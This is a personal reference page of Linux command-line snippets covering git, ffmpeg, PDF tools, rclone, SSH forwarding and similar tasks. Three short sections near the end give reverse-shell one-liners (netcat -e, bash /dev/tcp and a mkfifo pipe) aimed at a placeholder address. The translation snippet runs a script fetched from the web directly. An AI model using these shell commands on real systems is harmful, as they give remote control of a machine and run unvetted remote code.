---
title: Snippets
description: "Some one-liners and code snippets that are useuful"
---

## Using awk, tr, to get the remote info of a git repo
This will output the (fetch) remote of a git repository and
put the contents into the clipboard

```
git remote -v | awk '{print $2}' | head -1 | tr -d '\n' | xsel -ib
```


## Using image magick to create single color canvas
This create a 100x100 image with the color #131313


    $ convert -size 100x100 canvas:#131313 canvas.png


## Finding out your RAM details
    
    $ sudo dmidecode --type 17


## Recording Audio
    
    $ arecord -f cd > sample.wav 

It can also be piped to ffmpeg to encode it directly

    $ arecord -f cd | ffmpeg -i - out.mp3


## Generate random md5sums
This script will generate random md5sums and write to stdout and also write to
the file `md5s`

    $ while ; do; dd status=none count=1 bs=8 if=/dev/urandom | md5sum | \
    cut -d " " -f 1 | tee -a md5s; done


## Get a random number from 0-10
    
    $ expr $RANDOM % 10


## Quickly convert a CRLF ascii-file (dos format) to unix ascii
    $ cat old.txt | tr -d '\015' > new.txt


## Translation on cmd line

    $ gawk -f <(curl -Ls git.io/translate) -- -shell 

See more: www.soimort.org/translate-shell/ 


## Mount an MTP device 

    # To list the devices
    $ simple-mtpfs -l 

    # To mount the device labeled '1'
    $ simple-mtpfs --device 1 <mount path>


## Refresh pacman keys
    
    $ sudo pacman-key --refresh-keys 


## Record your screen

    $ ffmpeg -video_size 1366x768 -f x11grab -i :0 rec`date +%s`.mp4

with audio:

    $ ffmpeg -video_size 1366x768 -f x11grab -i :0 -f alsa -i default out.mkv



## A good example of unix piping
This one liner downloads all the podcast episodes from notrelated.xyz
This serves as more of an example to show the power and simplicity of piping.

    $ curl -s https://notrelated.xyz/ | grep mp3 | cut -d '"' -f4 | xargs wget


## More info about a file
using the `-i` optoin of `file` you can get some more info about the file like
the charset, mime type, etc
    $ file -i file


## Mount a cloud storage as filesystem
Using rclone. Will have to run `rclone config` initially to set it up

    $ rclone remote:path /path/to/mountpoint -vv --vfs-cache-mode full mount 

`-vv` - Verbose
`--vfs-cache-mode` - cache mode set to 'full' (see manpage)

## Display and control your android device

    $ scrcpy

## Record your android screen

    $ adb shell screenrecord /sdcard/rec.mp4 && adb pull /sdcard/rec.mp4


## Playing videos on a text console (tty)

mpv has an option to specifiy a video output driver (`--vo=<driver>`) and one
of them is drm (Direct Rendering Manager). It Uses Kernel Mode Setting to
render video. It can be used if one doesn't want to use a full-blown
graphical environment.

    $ mpv --vo=drm --drm-connector=1.eDP-1 file.mp4

Here '1' in `drm-connector` is the the gpu number in case of multiple video
cards. Use `drm-connector=help` to list the available connectors.

    $ mpv --vo=gpu --gpu-context=drm --drm-connector=1.eDP-1 file.mp4

This version uses gpu acceleration.


## Concatenating multiple media files using ffmpeg

A text file consisting of list of files to concatenate has to be created
``` filelist.txt
file '/path/to/file1'
file '/path/to/file2'
file '/path/to/file3'
```

    $ ffmpeg -f concat -safe 0 -i filelist.txt -c copy outputfile.<ext>

`safe 0` is not required if the paths are relative


## Splice a pdf

    $ pdftk in.pdf cat 1-8 11-end output out.pdf

This will exclude the pages 9 and 10 from the 'in.pdf' and write it to out.pdf


## Show a list of man pages using dmenu and select one

    $ man -k . | dmenu | cut -d ' ' -f1 | xargs man


## SSH Remote port forwarding

    $ ssh -N -R 9000:localhost:5000 user@example.com

This forwards any requests sent on port 9000 of example.com to the localhost
port of 5000. So basically you are exposing port 5000 on your localhost.
The `-N` flag just tells ssh to not log-in to the server

The following should be enabled in `/etc/ssh/sshd_conf` of the ssh server
(at example.com):
```/etc/ssh/sshd_conf
AllowTcpForwarding yes
GatewayPorts yes
```

## Get information about a YT video

    $ ytdl -i https://youtu.be/KaEj_qZgiKY 

ytdl comes with 'python-pafy' package on arch


## Change pdf page size

    $ pdfjam --outfile out.pdf --paper a4paper in.pdf 


## Reverse Shell using netcat
    
    $ nc -e /bin/sh 10.10.10.10 1234

    
## Reverse Shell using Bash

    $ bash -i >& /dev/tcp/10.10.10.10/1234 0>&1

you then listen for a connection on remote with `nc -l 1234`


## Reverse Shell using /bin/sh

    $ rm -f /tmp/f; mkfifo /tmp/f
    $ cat /tmp/f | /bin/sh -i 2>&1 | nc -l 1234 > tmp/f

On remote simply connect using nc on port 1234.

This is actually documented in the man page of netcat that doesn't have the
`-e`/`-c` option.


## List the authors of a git repo in descending order of number of commits

    $ git log --format='%an'| sort | uniq -c | sort -nr


## A Python one-liner to convert a csv to json

    $ python -c 'import csv,json,sys; print(json.dumps(list(csv.DictReader(sys.stdin))))' 

Pipe into this a csv to get a json

Example:

    $ curl -s imdb.com/list/ls020046354/export | python -c 'import csv,json,sys; print(json.dumps(list(csv.DictReader(sys.stdin))))'
